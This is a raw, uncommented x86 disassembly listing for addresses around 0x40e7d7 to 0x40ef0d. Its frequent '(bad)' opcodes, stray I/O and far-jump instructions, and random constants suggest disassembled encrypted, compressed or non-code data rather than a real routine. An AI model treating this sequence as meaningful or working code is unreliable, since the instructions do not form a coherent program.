  40e7d7:	nop
  40e7d8:	cmp    edx,ebp
  40e7da:	xlat   BYTE PTR ds:[ebx]
  40e7db:	mov    DWORD PTR [ecx+0x1de91556],esp
  40e7e1:	pop    ds
  40e7e2:	xor    DWORD PTR [ecx-0x67],0xffffff93
  40e7e6:	mov    DWORD PTR [ecx],edi
  40e7e8:	(bad)  
  40e7ea:	(bad)  
  40e7eb:	ins    BYTE PTR es:[edi],dx
  40e7ec:	push   cs
  40e7ed:	cmp    ah,bl
  40e7ef:	jge    0x40e7be
  40e7f1:	std    
  40e7f2:	sahf   
  40e7f3:	scas   eax,DWORD PTR es:[edi]
  40e7f4:	lods   eax,DWORD PTR ds:[esi]
  40e7f5:	and    DWORD PTR [esi-0x52],esp
  40e7f8:	arpl   WORD PTR [eax+0x24e34452],si
  40e7fe:	adc    DWORD PTR [esi],edx
  40e800:	mov    ch,0x99
  40e802:	dec    eax
  40e803:	adc    BYTE PTR [ecx+0x726d5191],bl
  40e809:	pop    es
  40e80a:	mov    esp,DWORD PTR [edi]
  40e80c:	sti    
  40e80d:	aad    0x8d
  40e80f:	jmp    0xa50ea393
  40e814:	fidiv  DWORD PTR [ebx]
  40e816:	mov    dl,0xe8
  40e818:	sub    eax,0xc9de3d09
  40e81d:	pop    edi
  40e81e:	aaa    
  40e81f:	in     al,dx
  40e820:	pop    esi
  40e821:	xchg   edi,eax
  40e822:	cmp    ebp,DWORD PTR [edx-0x4a]
  40e825:	push   ebx
  40e826:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e827:	inc    ebx
  40e828:	pop    ecx
  40e829:	sar    DWORD PTR [ecx+edi*1],cl
  40e82c:	xor    DWORD PTR [edx+0x4b],edi
  40e82f:	loope  0x40e7ea
  40e831:	pusha  
  40e832:	loopne 0x40e881
  40e834:	xchg   DWORD PTR [ecx-0x33],ebx
  40e837:	(bad)
  40e83b:	pop    ss
  40e83c:	cmp    edi,esi
  40e83e:	or     eax,0x5ed137d6
  40e843:	scas   al,BYTE PTR es:[edi]
  40e844:	enter  0xd0a,0x26
  40e848:	imul   edi,DWORD PTR [ecx],0xdd6429ae
  40e84e:	(bad)  
  40e84f:	aad    0x48
  40e851:	loope  0x40e7e3
  40e853:	mov    al,ds:0x2ff81400
  40e858:	or     esp,DWORD PTR [eax+0x4c]
  40e85b:	sbb    DWORD PTR [edx+ebp*4-0x8],eax
  40e85f:	mov    bl,0xd1
  40e861:	push   eax
  40e862:	add    BYTE PTR [ecx+0x3c],dh
  40e865:	xor    ah,BYTE PTR [ebp-0x74766767]
  40e86b:	pop    edi
  40e86c:	adc    eax,0x36e75834
  40e871:	jl     0x40e8b1
  40e873:	repnz leave 
  40e875:	push   0x24711550
  40e87a:	shl    BYTE PTR [ecx],cl
  40e87c:	fst    DWORD PTR [ebp+ebx*4-0x68]
  40e880:	xchg   edx,eax
  40e881:	scas   al,BYTE PTR es:[edi]
  40e882:	aaa    
  40e883:	jle    0x40e8c1
  40e885:	sub    al,0xbf
  40e887:	adc    DWORD PTR [eax],edx
  40e889:	test   DWORD PTR [esp+esi*4-0x639836cd],edx
  40e890:	xor    BYTE PTR ds:0xa80ac509,bl
  40e896:	test   eax,0xf68ddd0a
  40e89b:	dec    edx
  40e89c:	ret    0x4278
  40e89f:	out    dx,al
  40e8a0:	sar    DWORD PTR [ebp-0x64c87739],1
  40e8a6:	or     edi,esi
  40e8a8:	outs   dx,BYTE PTR ds:[esi]
  40e8a9:	or     edx,DWORD PTR [edi-0x79aa2b7c]
  40e8af:	mov    esp,0xf5bd7417
  40e8b4:	mov    eax,0xf2555a47
  40e8b9:	sbb    eax,DWORD PTR [eax+0x66]
  40e8bc:	inc    ebp
  40e8bd:	jecxz  0x40e90d
  40e8bf:	movaps xmm0,xmm7
  40e8c2:	pop    esp
  40e8c3:	mov    BYTE PTR [ecx],dl
  40e8c5:	xlat   BYTE PTR ds:[ebx]
  40e8c6:	adc    dh,BYTE PTR [edi]
  40e8c8:	pop    ss
  40e8c9:	movaps xmm3,XMMWORD PTR [edx]
  40e8cc:	mov    dh,0x2a
  40e8ce:	xor    eax,0xe508efc3
  40e8d3:	(bad)  
  40e8d4:	cmp    eax,0x9ad841de
  40e8d9:	arpl   bx,bp
  40e8db:	test   al,0xf8
  40e8dd:	lods   al,BYTE PTR ds:[esi]
  40e8de:	fnsave [eax]
  40e8e0:	jb     0x40e947
  40e8e2:	pop    edi
  40e8e3:	pop    esi
  40e8e4:	adc    ch,0x27
  40e8e7:	in     eax,0x59
  40e8e9:	and    al,BYTE PTR [ecx]
  40e8eb:	je     0x40e89e
  40e8ed:	test   al,0x71
  40e8ef:	js     0x40e95e
  40e8f1:	stos   BYTE PTR es:[edi],al
  40e8f2:	out    dx,al
  40e8f3:	(bad)  
  40e8f4:	dec    eax
  40e8f5:	cmp    BYTE PTR [edi+0x2e],0xb7
  40e8f9:	cld    
  40e8fa:	xor    eax,0xf491f039
  40e8ff:	inc    ebx
  40e900:	jno    0x40e91e
  40e902:	jae    0x40e8a0
  40e904:	mov    ds:0xd869fabb,eax
  40e909:	xor    BYTE PTR [eax-0x6f],bh
  40e90c:	mov    edi,0x9eaec078
  40e911:	dec    DWORD PTR [edi]
  40e913:	shl    BYTE PTR ds:0xea95e970,1
  40e919:	pushf  
  40e91a:	mov    edx,0xe72efc9
  40e91f:	adc    al,0x65
  40e921:	test   BYTE PTR [edi*2+0x15f400ae],dl
  40e928:	push   ss
  40e929:	retf   
  40e92a:	or     ebx,edi
  40e92c:	loopne 0x40e937
  40e92e:	xor    al,0x3d
  40e930:	imul   ebp,DWORD PTR [ebx+edx*4],0xd0d4c75b
  40e937:	int    0xb0
  40e939:	push   edx
  40e93a:	lock and al,0x77
  40e93d:	lods   eax,DWORD PTR ds:[esi]
  40e93e:	(bad)  
  40e93f:	jnp    0x40e966
  40e941:	and    al,0xf3
  40e943:	push   edi
  40e944:	sbb    BYTE PTR [ebx+edi*1],cl
  40e947:	add    al,0xae
  40e949:	jmp    0x6a1a0c90
  40e94e:	call   DWORD PTR [ebx+esi*2-0x65]
  40e952:	mov    al,0x42
  40e954:	ret    
  40e955:	mov    eax,0x1c6d294d
  40e95a:	add    al,0x2e
  40e95c:	push   esi
  40e95d:	add    ch,BYTE PTR [eax]
  40e95f:	int3   
  40e960:	pop    ds
  40e961:	sbb    al,0x7
  40e963:	mov    WORD PTR [esi+0x70],es
  40e966:	mov    dh,0x67
  40e968:	aaa    
  40e969:	popa   
  40e96a:	daa    
  40e96b:	mov    esi,0xc225fdab
  40e970:	cmp    bh,0xd5
  40e973:	jp     0x40e9b5
  40e975:	sbb    DWORD PTR [edi],0x6a
  40e978:	sbb    BYTE PTR [edi+0x45],dh
  40e97b:	dec    edi
  40e97c:	icebp  
  40e97d:	xchg   BYTE PTR [eax+0xf7e7f2a],dh
  40e983:	pop    ebx
  40e984:	(bad)  
  40e985:	repnz arpl sp,ax
  40e988:	pop    esi
  40e989:	in     al,0x47
  40e98b:	stc    
  40e98c:	push   es
  40e98d:	imul   ebx,DWORD PTR [ebx],0x8d924232
  40e993:	leave  
  40e994:	adc    cl,BYTE PTR [edi]
  40e996:	test   DWORD PTR [edi],eax
  40e998:	ja     0x40e9e1
  40e99a:	outs   dx,DWORD PTR ds:[esi]
  40e99b:	push   es
  40e99c:	xchg   ebx,eax
  40e99d:	jmp    0x5820:0xce5c54dd
  40e9a4:	or     esi,edi
  40e9a6:	test   eax,0x1443e530
  40e9ab:	sti    
  40e9ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e9ad:	mov    ebx,0x1e27968
  40e9b2:	xchg   esi,eax
  40e9b3:	into   
  40e9b4:	cwde   
  40e9b5:	lods   eax,DWORD PTR ds:[esi]
  40e9b6:	ss cmp DWORD PTR gs:[ebp-0x2c],edx
  40e9bb:	jp     0x40e978
  40e9bd:	mov    bh,0x4e
  40e9bf:	imul   edi,DWORD PTR [edi+0x61],0xffffffd7
  40e9c3:	and    BYTE PTR [edx+0x20cabeb3],dl
  40e9c9:	xchg   dl,bh
  40e9cb:	fadd   st,st(6)
  40e9cd:	das    
  40e9ce:	jnp    0x40e9bd
  40e9d0:	adc    dh,0xb7
  40e9d3:	mov    bh,0xb
  40e9d5:	add    ebp,DWORD PTR [edi+edx*1]
  40e9d8:	inc    eax
  40e9d9:	je     0x40ea4c
  40e9db:	dec    ebx
  40e9dc:	bound  esi,QWORD PTR [edx]
  40e9de:	idiv   esp
  40e9e0:	adc    bl,ch
  40e9e2:	pop    esp
  40e9e3:	sub    ch,BYTE PTR [eax-0x4471c0b0]
  40e9e9:	mov    al,ds:0x7b1106d1
  40e9ee:	out    0x84,eax
  40e9f0:	aam    0xa6
  40e9f2:	pop    ebp
  40e9f3:	test   eax,0xcb06f169
  40e9f8:	fstp   TBYTE PTR [edx+eiz*8]
  40e9fb:	mov    dh,BYTE PTR [ebx-0x80]
  40e9fe:	push   cs
  40e9ff:	fldz   
  40ea01:	mov    bh,0x40
  40ea03:	push   edx
  40ea04:	cmp    eax,0xf312585b
  40ea09:	data16 aas 
  40ea0b:	out    dx,al
  40ea0c:	adc    DWORD PTR [edi-0x16af3929],edi
  40ea12:	lea    esi,[ebx+0x71aece10]
  40ea18:	mov    dl,BYTE PTR [edx]
  40ea1a:	jge    0x40ea4f
  40ea1c:	and    al,0x2e
  40ea1e:	rol    ebp,0x16
  40ea21:	inc    esp
  40ea22:	ins    DWORD PTR es:[edi],dx
  40ea23:	sbb    bl,BYTE PTR [esp+ebx*2-0x2a]
  40ea27:	ret    
  40ea28:	sbb    eax,0x1bbe8a72
  40ea2d:	push   ss
  40ea2e:	test   BYTE PTR [ecx+edi*1-0x10],ch
  40ea32:	jmp    DWORD PTR [eax]
  40ea34:	mov    esi,0x50baf8ee
  40ea39:	loope  0x40ea41
  40ea3b:	jb     0x40e9f2
  40ea3d:	jo     0x40eaa5
  40ea3f:	push   edi
  40ea40:	aas    
  40ea41:	aam    0x1e
  40ea43:	push   eax
  40ea44:	data16 aaa 
  40ea46:	inc    esi
  40ea47:	loopne 0x40e9ea
  40ea49:	(bad)  
  40ea4b:	mov    ecx,0x32a47c46
  40ea50:	push   0xfffffff8
  40ea52:	mov    ecx,0x88d7f95f
  40ea57:	or     eax,ecx
  40ea59:	(bad)  
  40ea5a:	fsubr  st(3),st
  40ea5c:	jmp    0x40ea73
  40ea5e:	cli    
  40ea5f:	addr16 pop esp
  40ea61:	mov    esp,0x9f40ac4e
  40ea66:	and    eax,0x7d6e74c5
  40ea6b:	sbb    bl,ch
  40ea6d:	mov    ah,0x7b
  40ea6f:	mov    bh,0x63
  40ea71:	sbb    dh,0x8f
  40ea74:	retf   
  40ea75:	fidiv  WORD PTR [ecx+eiz*8-0x4b]
  40ea79:	cmp    eax,0xf306585c
  40ea7e:	pop    ss
  40ea7f:	cmp    al,0xd9
  40ea81:	in     eax,0xbc
  40ea83:	stc    
  40ea84:	and    ch,ah
  40ea86:	(bad)  
  40ea88:	out    dx,eax
  40ea89:	and    bl,BYTE PTR [eax-0x2b56547a]
  40ea8f:	lds    eax,FWORD PTR [ebp+0x68]
  40ea92:	(bad)  
  40ea94:	sbb    dh,dh
  40ea96:	imul   esi,ebx,0xb8e5dc5c
  40ea9c:	xor    eax,0xf4eb7076
  40eaa1:	pop    ebx
  40eaa2:	inc    edx
  40eaa3:	pop    esi
  40eaa4:	jecxz  0x40ea90
  40eaa6:	cs push edi
  40eaa8:	jno    0x40eac6
  40eaaa:	test   ebx,edx
  40eaac:	std    
  40eaad:	and    bh,BYTE PTR [edi]
  40eaaf:	and    ebx,DWORD PTR [edi-0x49]
  40eab2:	je     0x40ea98
  40eab4:	xchg   ecx,eax
  40eab5:	add    ecx,esp
  40eab7:	ror    DWORD PTR [ebx-0x36],0xf7
  40eabb:	in     eax,dx
  40eabc:	pop    edi
  40eabd:	outs   dx,BYTE PTR ds:[esi]
  40eabe:	cli    
  40eabf:	js     0x40eb35
  40eac1:	add    BYTE PTR [esi-0x24],dl
  40eac4:	pop    edx
  40eac5:	mov    ebx,0x9b2ec52e
  40eaca:	add    eax,0x6bffee69
  40eacf:	(bad)  
  40ead0:	int3   
  40ead1:	mov    eax,DWORD PTR [edx+0x719d6301]
  40ead7:	sahf   
  40ead8:	xchg   bl,dh
  40eada:	test   al,0xbb
  40eadc:	jecxz  0x40ea90
  40eade:	dec    eax
  40eadf:	scas   al,BYTE PTR es:[edi]
  40eae0:	rol    DWORD PTR [esi-0x62],0x24
  40eae4:	or     DWORD PTR [edi],ebp
  40eae6:	je     0x40eab5
  40eae8:	lods   eax,DWORD PTR ds:[esi]
  40eae9:	iret   
  40eaea:	into   
  40eaeb:	sub    BYTE PTR ds:0x1b58dfe6,bl
  40eaf1:	in     al,0xa7
  40eaf3:	je     0x40ea99
  40eaf5:	jecxz  0x40eb45
  40eaf7:	stos   BYTE PTR es:[edi],al
  40eaf8:	pop    esi
  40eaf9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eafa:	gs mov bh,0x4b
  40eafd:	ins    BYTE PTR es:[edi],dx
  40eafe:	xchg   ebx,eax
  40eaff:	mov    eax,ds:0xc551f1e0
  40eb04:	test   eax,0x61cf1187
  40eb09:	push   esp
  40eb0a:	es mov bh,0xb1
  40eb0d:	jae    0x40eb00
  40eb0f:	adc    bl,bh
  40eb11:	int    0x5b
  40eb13:	test   eax,0x46c522f7
  40eb18:	fmul   QWORD PTR [edx-0x51]
  40eb1b:	xchg   DWORD PTR [eax],eax
  40eb1d:	cli    
  40eb1e:	sbb    BYTE PTR [edi],ch
  40eb20:	jno    0x40eba0
  40eb22:	cmp    al,0x16
  40eb24:	push   edi
  40eb25:	scas   al,BYTE PTR es:[edi]
  40eb26:	cwde   
  40eb27:	sar    DWORD PTR [edx],cl
  40eb29:	sti    
  40eb2a:	and    al,0xc3
  40eb2c:	push   cs
  40eb2d:	test   eax,0x3b73bc30
  40eb32:	cmp    DWORD PTR [eax],ecx
  40eb34:	ror    BYTE PTR [eax],1
  40eb36:	imul   BYTE PTR [ebx+eiz*8]
  40eb39:	aam    0x73
  40eb3b:	mov    dl,0x9f
  40eb3d:	sbb    DWORD PTR [edx+0x28],0x46
  40eb41:	mov    ah,0xc2
  40eb43:	mov    BYTE PTR [eax+0x2c],al
  40eb46:	mov    ecx,0x6a8bcb4c
  40eb4b:	popf   
  40eb4c:	je     0x40eb96
  40eb4e:	ja     0x40eb1d
  40eb50:	cmp    esi,DWORD PTR [ebx+0xd]
  40eb53:	pop    esi
  40eb54:	sbb    BYTE PTR [ecx+0x7f],bh
  40eb57:	pop    ss
  40eb58:	adc    al,BYTE PTR [edx-0x65]
  40eb5b:	test   al,0xda
  40eb5d:	dec    ebp
  40eb5e:	es pop esi
  40eb60:	mov    ds:0xd89f5e74,al
  40eb65:	ja     0x40eb9f
  40eb67:	sub    ebp,ecx
  40eb69:	mov    ebp,0x5717df28
  40eb6e:	scas   al,BYTE PTR es:[edi]
  40eb6f:	loopne 0x40ebb7
  40eb71:	mov    dl,0x5b
  40eb73:	mov    ds:0x4ceee82d,al
  40eb78:	fwait
  40eb79:	add    eax,0xe5bf3f24
  40eb7e:	push   ebx
  40eb7f:	sub    al,BYTE PTR [ebx]
  40eb81:	add    ecx,eax
  40eb83:	mov    edx,0x9ceb665c
  40eb88:	inc    esp
  40eb89:	mov    ?,WORD PTR [edx+0x5409e2a6]
  40eb8f:	(bad)  
  40eb91:	fstp   QWORD PTR [esi]
  40eb93:	push   0xde1713a7
  40eb98:	popa   
  40eb99:	pushf  
  40eb9a:	stc    
  40eb9b:	test   DWORD PTR [ecx],ebx
  40eb9d:	leave  
  40eb9e:	inc    eax
  40eb9f:	aaa    
  40eba0:	add    al,0x56
  40eba2:	xor    edi,esp
  40eba4:	pop    eax
  40eba5:	scas   eax,DWORD PTR es:[edi]
  40eba6:	xchg   ebp,eax
  40eba7:	pusha  
  40eba8:	dec    edx
  40eba9:	adc    DWORD PTR ds:0xa178bc1f,edi
  40ebaf:	xchg   ebp,ebx
  40ebb1:	cmc    
  40ebb2:	mov    edx,0x24373594
  40ebb7:	dec    eax
  40ebb8:	add    al,0xda
  40ebba:	or     BYTE PTR [di+0x6b24],ah
  40ebbf:	lods   al,BYTE PTR ds:[esi]
  40ebc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ebc1:	inc    eax
  40ebc2:	add    dh,BYTE PTR [edi+ecx*8+0x6a]
  40ebc6:	mov    eax,ebx
  40ebc8:	jecxz  0x40eba0
  40ebca:	dec    ebp
  40ebcb:	cmp    dl,cl
  40ebcd:	or     ecx,DWORD PTR [edi+ecx*1+0x4e]
  40ebd1:	jecxz  0x40eb61
  40ebd3:	popa   
  40ebd4:	sbb    eax,DWORD PTR [edx+0x18]
  40ebd7:	pushf  
  40ebd8:	(bad)  [ebp+esi*4-0x35]
  40ebdc:	and    eax,0x7dfe082a
  40ebe1:	mov    dl,0x20
  40ebe3:	mov    cl,0xc8
  40ebe5:	mov    DWORD PTR cs:[esi],ebx
  40ebe8:	xchg   esp,eax
  40ebe9:	adc    ebp,DWORD PTR [ecx+eax*1]
  40ebec:	loop   0x40ebb0
  40ebee:	(bad)  
  40ebef:	push   ds
  40ebf0:	pop    ds
  40ebf1:	pop    ebx
  40ebf2:	inc    eax
  40ebf3:	xchg   esp,eax
  40ebf4:	mov    ds:0x31f69342,eax
  40ebf9:	cmp    DWORD PTR [esi+0x3af90b77],esi
  40ebff:	adc    ebp,DWORD PTR [ecx-0x66df8e54]
  40ec05:	pop    ss
  40ec06:	stos   BYTE PTR es:[edi],al
  40ec07:	jae    0x40ec19
  40ec09:	xchg   DWORD PTR [edx],ebx
  40ec0b:	test   bh,bl
  40ec0d:	lods   eax,DWORD PTR ds:[esi]
  40ec0e:	sub    eax,0x9f849bfb
  40ec13:	sbb    eax,0x31c800ea
  40ec18:	mov    ds:0xeabd5bc2,eax
  40ec1d:	sahf   
  40ec1e:	imul   ecx,DWORD PTR [eax+0x646cb1fa],0x15
  40ec25:	and    BYTE PTR [eax+0x59],ch
  40ec28:	mov    ebx,eax
  40ec2a:	sti    
  40ec2b:	mov    WORD PTR [edx-0x7408f0e1],?
  40ec31:	aam    0xd5
  40ec33:	dec    eax
  40ec34:	pop    edx
  40ec35:	cmp    al,0x49
  40ec37:	cwde   
  40ec38:	jmp    0x80ac:0x48337652
  40ec3f:	push   ecx
  40ec40:	fisttp WORD PTR ds:0x39a3829e
  40ec46:	jmp    0x40ebf7
  40ec48:	push   ebx
  40ec49:	fsub   st,st(2)
  40ec4b:	rcl    dl,1
  40ec4d:	xchg   ebp,eax
  40ec4e:	out    0x2c,al
  40ec50:	out    dx,al
  40ec51:	js     0x40ec9a
  40ec53:	adc    eax,0x42296604
  40ec58:	cdq    
  40ec59:	jmp    0xd5501523
  40ec5e:	mul    eax
  40ec60:	rcl    BYTE PTR [ecx-0x5],0x41
  40ec64:	(bad)  
  40ec65:	jmp    0xd76c:0xb24e77ab
  40ec6c:	jo     0x40ecb9
  40ec6e:	mov    edi,0x544e4110
  40ec73:	jmp    0x40ec30
  40ec75:	mov    ecx,0xa5aa86f8
  40ec7a:	xchg   ebx,eax
  40ec7b:	jns    0x40ec95
  40ec7d:	xor    eax,DWORD PTR [esi]
  40ec7f:	sbb    eax,0xf19a6697
  40ec84:	adc    al,0xe4
  40ec86:	lahf   
  40ec87:	scas   eax,DWORD PTR es:[edi]
  40ec88:	test   eax,0xdf819538
  40ec8d:	dec    eax
  40ec8e:	cmc    
  40ec8f:	sbb    DWORD PTR ds:0x593ed47d,ebx
  40ec95:	fistp  DWORD PTR [ebx+0x65]
  40ec98:	mov    bl,0x74
  40ec9a:	retf   0xe1ee
  40ec9d:	jns    0x40ec23
  40ec9f:	add    al,0x51
  40eca1:	enter  0x35a6,0x62
  40eca5:	dec    edx
  40eca6:	mov    ah,0xfc
  40eca8:	ror    DWORD PTR [ebx+0x34],0x99
  40ecac:	add    eax,0x9ed9932
  40ecb1:	daa    
  40ecb2:	sahf   
  40ecb3:	icebp  
  40ecb4:	mov    edi,0xde8071b2
  40ecb9:	shl    ebx,1
  40ecbb:	xchg   ebx,eax
  40ecbc:	std    
  40ecbd:	repnz fdivp st(5),st
  40ecc0:	loopne 0x40ed1e
  40ecc2:	ja     0x40ecc4
  40ecc4:	cli    
  40ecc5:	mov    al,0xfa
  40ecc7:	mov    al,0x60
  40ecc9:	push   edx
  40ecca:	dec    esi
  40eccb:	xchg   ebx,eax
  40eccc:	mov    eax,0xb308e492
  40ecd1:	cmp    al,0x16
  40ecd3:	jbe    0x40ecf5
  40ecd5:	inc    esp
  40ecd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ecd7:	cmp    bh,BYTE PTR [edx+edx*2+0x43]
  40ecdb:	xor    BYTE PTR [ebx+0x6c028825],0x3b
  40ece2:	mov    edx,esp
  40ece4:	repnz xor edi,ebp
  40ece7:	mov    DWORD PTR [esi-0x24362da4],0x914d1300
  40ecf1:	add    eax,0xf03fd8fb
  40ecf6:	iret   
  40ecf7:	rcr    DWORD PTR [esi+0x129ba13f],1
  40ecfd:	ss aas 
  40ecff:	hlt    
  40ed00:	fadd   st(2),st
  40ed02:	mov    ebx,0xdcd7af5f
  40ed07:	mov    esp,DWORD PTR [esp+ebx*8]
  40ed0a:	sbb    ch,BYTE PTR ds:0xf7a2fc49
  40ed10:	xchg   ebp,eax
  40ed11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed12:	add    eax,0x8fcc5abb
  40ed17:	pop    ds
  40ed18:	scas   eax,DWORD PTR es:[edi]
  40ed19:	sbb    dl,BYTE PTR ds:0x1924c4a3
  40ed1f:	lea    esp,[ebx+0x13fb9489]
  40ed25:	popf   
  40ed26:	xlat   BYTE PTR ds:[ebx]
  40ed27:	mov    DWORD PTR [edi+0x2d],ecx
  40ed2a:	inc    esi
  40ed2b:	or     eax,0xe41606b7
  40ed30:	pop    ecx
  40ed31:	cmc    
  40ed32:	xchg   BYTE PTR [edi+0x51b13a96],al
  40ed38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed39:	or     bh,BYTE PTR [ebx-0x7f]
  40ed3c:	lea    ebp,[edx-0x3d]
  40ed3f:	nop
  40ed40:	inc    edi
  40ed41:	std    
  40ed42:	out    dx,eax
  40ed43:	test   DWORD PTR [esi+0x52],ebx
  40ed46:	dec    eax
  40ed47:	div    DWORD PTR [edx+esi*2-0x60]
  40ed4b:	mov    ch,0xd6
  40ed4d:	jbe    0x40edb5
  40ed4f:	clc    
  40ed50:	or     eax,0xfb94930
  40ed55:	lds    ecx,FWORD PTR [esi-0x4471729d]
  40ed5b:	push   edx
  40ed5c:	adc    edi,DWORD PTR [ebx]
  40ed5e:	and    cl,BYTE PTR [eax+0x1fb924de]
  40ed64:	xchg   ebp,eax
  40ed65:	xor    BYTE PTR [edx],cl
  40ed67:	arpl   di,bx
  40ed69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed6a:	dec    ebp
  40ed6b:	cmp    eax,0x26c7c380
  40ed70:	push   es
  40ed71:	add    al,0x1c
  40ed73:	mov    esi,0x70290fbf
  40ed78:	ficom  DWORD PTR [esi-0x63f889af]
  40ed7e:	xor    ch,BYTE PTR [ebx]
  40ed80:	popa   
  40ed81:	sbb    al,0x8a
  40ed83:	or     edi,esi
  40ed85:	mov    ebx,0xf0ed6fea
  40ed8a:	push   cs
  40ed8b:	std    
  40ed8c:	cmp    BYTE PTR [ebx],al
  40ed8e:	loop   0x40ed99
  40ed90:	mov    ah,0xb5
  40ed92:	xchg   edi,eax
  40ed93:	xchg   edi,eax
  40ed94:	in     eax,0x1a
  40ed96:	icebp  
  40ed97:	gs jge 0x40ed85
  40ed9a:	lds    ecx,FWORD PTR [ecx]
  40ed9c:	bnd jae 0x40edc0
  40ed9f:	popf   
  40eda0:	adc    eax,0xe2dd44da
  40eda5:	aam    0x3a
  40eda7:	xchg   ebx,eax
  40eda8:	cmp    al,0x35
  40edaa:	loope  0x40ee00
  40edac:	push   esp
  40edad:	xchg   ecx,eax
  40edae:	push   eax
  40edaf:	jmp    DWORD PTR [ebx]
  40edb1:	aaa    
  40edb2:	mov    al,0x4c
  40edb4:	jmp    0xedd4:0x87f17496
  40edbb:	mov    ch,BYTE PTR [ecx-0x75]
  40edbe:	imul   esp,DWORD PTR [eax+eax*8-0xe],0xb075f5d1
  40edc6:	in     eax,0xb6
  40edc8:	(bad)  
  40edc9:	out    0xf4,eax
  40edcb:	and    bl,BYTE PTR [ecx]
  40edcd:	mov    bl,0x31
  40edcf:	outs   dx,BYTE PTR ds:[esi]
  40edd0:	mov    ch,BYTE PTR [ecx-0x5c]
  40edd3:	mov    ds:0xc12cbc10,eax
  40edd8:	enter  0x2eae,0xbc
  40eddc:	adc    ah,dh
  40edde:	popf   
  40eddf:	jne    0x40ee4f
  40ede1:	sahf   
  40ede2:	sub    al,0x67
  40ede4:	mov    al,ds:0xf53b93e1
  40ede9:	je     0x40ed90
  40edeb:	push   edx
  40edec:	fistp  DWORD PTR [ebx+edi*8]
  40edef:	mov    ebp,0xdf11848b
  40edf4:	jne    0x40edc3
  40edf6:	jg     0x40ee2b
  40edf8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40edf9:	pushf  
  40edfa:	ins    BYTE PTR es:[edi],dx
  40edfb:	std    
  40edfc:	call   0x18fd:0xf844a5c0
  40ee03:	cmc    
  40ee04:	lahf   
  40ee05:	out    dx,al
  40ee06:	in     al,0x3a
  40ee08:	push   ds
  40ee09:	or     BYTE PTR [esi-0x1617f28e],0xc6
  40ee10:	clc    
  40ee11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee12:	xchg   ecx,eax
  40ee13:	dec    esp
  40ee14:	sbb    al,0xdc
  40ee16:	fnstcw WORD PTR [eax+0x2b94b8ed]
  40ee1c:	xchg   ecx,eax
  40ee1d:	fwait
  40ee1e:	adc    bl,BYTE PTR [edx]
  40ee20:	xchg   edx,eax
  40ee21:	cmp    eax,0x48e4ad63
  40ee26:	pop    esi
  40ee27:	sbb    dl,ch
  40ee29:	xor    BYTE PTR [eax-0x5a],al
  40ee2c:	nop
  40ee2d:	outs   dx,DWORD PTR ds:[esi]
  40ee2e:	arpl   dx,sp
  40ee30:	sub    esp,edi
  40ee32:	sbb    dh,BYTE PTR [esi+eiz*2]
  40ee35:	jno    0x40ee1e
  40ee37:	xor    eax,0x919040b2
  40ee3c:	fisub  WORD PTR [ecx]
  40ee3e:	sbb    eax,0x47088ad3
  40ee43:	adc    edi,eax
  40ee45:	ret    0x8737
  40ee48:	ins    DWORD PTR es:[edi],dx
  40ee49:	leave  
  40ee4a:	popa   
  40ee4b:	push   ebp
  40ee4c:	std    
  40ee4d:	push   edx
  40ee4e:	int    0x6f
  40ee50:	inc    dl
  40ee52:	sub    bl,BYTE PTR [eax+0x33]
  40ee55:	mov    dl,0x2d
  40ee57:	imul   DWORD PTR [edi+edx*1]
  40ee5a:	mov    edx,0xb2a12f8c
  40ee5f:	inc    esp
  40ee60:	leave  
  40ee61:	in     al,dx
  40ee62:	call   0x2779:0xe96be531
  40ee69:	enter  0xd656,0x6
  40ee6d:	(bad)  ds:0x518d9699
  40ee73:	mul    DWORD PTR [edi-0x25cc5539]
  40ee79:	or     DWORD PTR [ecx-0x69],ebp
  40ee7c:	and    eax,0x194488a2
  40ee81:	or     ecx,DWORD PTR [ebp+0x5c56a2d6]
  40ee87:	les    edi,FWORD PTR [eax-0x3ce9c382]
  40ee8d:	mov    BYTE PTR [ecx+0x6225dde2],cl
  40ee93:	xor    BYTE PTR [edx+0x51],0xaf
  40ee97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee98:	mov    ch,BYTE PTR [eax]
  40ee9a:	inc    eax
  40ee9b:	js     0x40ee38
  40ee9d:	xor    ah,BYTE PTR [ebx]
  40ee9f:	xchg   ebp,eax
  40eea0:	in     eax,dx
  40eea1:	jo     0x40ef15
  40eea3:	inc    edx
  40eea4:	pop    esp
  40eea5:	or     al,0xa3
  40eea7:	fdivr  QWORD PTR [ebx]
  40eea9:	test   bh,0x40
  40eeac:	add    dl,cl
  40eeae:	fs ret 
  40eeb0:	mov    eax,0x48d860cd
  40eeb5:	inc    edi
  40eeb6:	push   esi
  40eeb7:	xor    edi,DWORD PTR [ebx-0x63c722a8]
  40eebd:	sbb    al,0xd1
  40eebf:	mov    ecx,0x8850094e
  40eec4:	add    al,0xd1
  40eec6:	(bad)  
  40eec7:	sahf   
  40eec8:	call   0x68943c18
  40eecd:	jp     0x40ef3a
  40eecf:	popf   
  40eed0:	cdq    
  40eed1:	xor    ebp,eax
  40eed3:	push   ss
  40eed4:	rol    DWORD PTR [edi+0x7e1fdcbe],cl
  40eeda:	fldcw  WORD PTR [edx]
  40eedc:	(bad)  
  40eedd:	test   BYTE PTR [ebp+0x3b],ch
  40eee0:	call   0x70054cad
  40eee5:	mov    ebp,0x2af13389
  40eeea:	dec    ebx
  40eeeb:	mov    ah,0xcc
  40eeed:	xchg   edi,eax
  40eeee:	(bad)  
  40eef0:	xchg   BYTE PTR [ebx+0x7fa5456d],ch
  40eef6:	repz mov dh,0x2d
  40eef9:	mov    cl,0xee
  40eefb:	and    ah,al
  40eefd:	pusha  
  40eefe:	imul   ebp,DWORD PTR [eax+eiz*8-0x50],0x8538a9e8
  40ef06:	in     al,dx
  40ef07:	inc    ecx
  40ef08:	jb     0x40ef29
  40ef0a:	iret   
  40ef0b:	mov    bl,0x93
  40ef0d:	imul   ebp,ecx,0xa4275d60
